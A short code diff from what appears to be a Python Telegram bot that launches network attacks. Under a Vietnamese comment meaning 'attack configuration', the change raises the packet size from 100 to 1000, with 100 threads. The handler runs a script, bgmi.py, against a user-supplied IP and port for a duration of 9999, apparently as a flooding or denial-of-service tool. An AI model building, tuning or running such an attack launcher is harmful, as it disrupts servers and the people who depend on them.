@@ -106,7 +106,7 @@ async def handle_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
 
         # Cấu hình attack
-        packet_size = 100
+        packet_size = 1000
         threads = 100
         command = ["./bgmi.py", ip, str(port), "9999", str(packet_size), str(threads)]
 
